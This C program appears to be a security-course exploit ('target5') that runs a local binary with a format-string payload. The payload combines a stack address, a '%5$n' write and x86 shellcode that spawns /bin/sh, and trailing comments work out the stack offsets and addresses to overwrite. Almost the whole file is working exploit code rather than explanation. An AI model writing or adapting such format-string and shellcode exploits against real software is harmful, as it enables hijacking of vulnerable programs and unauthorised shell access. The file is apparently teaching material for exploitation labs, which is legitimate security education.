#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[60] = "\x3d\xfe\xff\xbf" //4 bytes used, 56 left
		 "%5$n"
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"; //45 bytes used by shell code + 4 bytes for addr to write into, 49 bytes total; 11 bytes left
		
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
//"offset" for stack args seems to be 5. That is, 5 "%x" until we access the pointer that we need to write into
//currently 0xbffffdfc
// fdfc = 65020
//%ebp is at 0xbffffe38 ---> so use 0xbffffe3d for addr to write into
// 1bfff = 49667
